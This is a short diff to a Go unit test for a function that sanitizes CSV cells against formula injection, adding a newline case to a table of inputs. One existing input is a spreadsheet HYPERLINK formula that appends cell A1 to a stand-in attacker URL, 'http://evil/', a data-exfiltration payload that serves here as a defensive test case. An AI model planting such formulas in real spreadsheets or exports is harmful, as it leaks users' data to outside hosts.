@@ -32,6 +32,7 @@ func TestSanitizeCSVCell(t *testing.T) {
 		{"at_scoped_npm", "@evil/pkg", "'@evil/pkg"},
 		{"tab", "\tx", "'\tx"},
 		{"carriage_return", "\rx", "'\rx"},
+		{"newline", "\nx", "'\nx"},
 		{"hyperlink", `=HYPERLINK("http://evil/"&A1)`, `'=HYPERLINK("http://evil/"&A1)`},
 		{"benign_package", "libssl1.1", "libssl1.1"},
 		{"benign_version", "1.2.3", "1.2.3"},
